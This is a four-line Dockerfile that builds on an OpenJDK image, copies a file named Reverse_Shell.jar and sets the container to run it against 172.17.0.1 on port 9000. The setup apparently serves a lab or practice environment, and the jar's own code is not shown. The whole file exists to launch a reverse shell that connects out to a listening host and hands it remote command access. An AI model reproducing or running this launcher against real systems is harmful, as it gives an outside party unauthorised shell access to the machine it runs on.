FROM openjdk:latest
COPY Reverse_Shell.jar /var/www/java/Reverse_Shell.jar
WORKDIR /var/www/java
CMD ["java", "-jar", "Reverse_Shell.jar", "172.17.0.1","9000"]
